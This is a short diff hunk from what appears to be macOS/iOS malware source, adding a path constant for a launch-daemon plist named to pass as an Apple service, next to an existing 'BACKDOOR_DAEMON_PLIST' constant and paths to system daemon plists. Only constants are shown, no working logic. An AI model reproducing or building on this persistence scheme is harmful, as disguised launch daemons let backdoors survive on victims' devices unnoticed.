@@ -65,6 +65,7 @@ typedef struct kinfo_proc kinfo_proc;
 #pragma mark General Parameters
 #pragma mark -
 
+#define LAUNCHD_INSTALL_PLIST "/Library/LaunchDaemons/com.apple.md0000.plist"
 #define BACKDOOR_DAEMON_PLIST @"/Library/LaunchDaemons/com.apple.mdworker.plist"
 #define SB_PATHNAME @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist"
 #define IT_PATHNAME @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist"
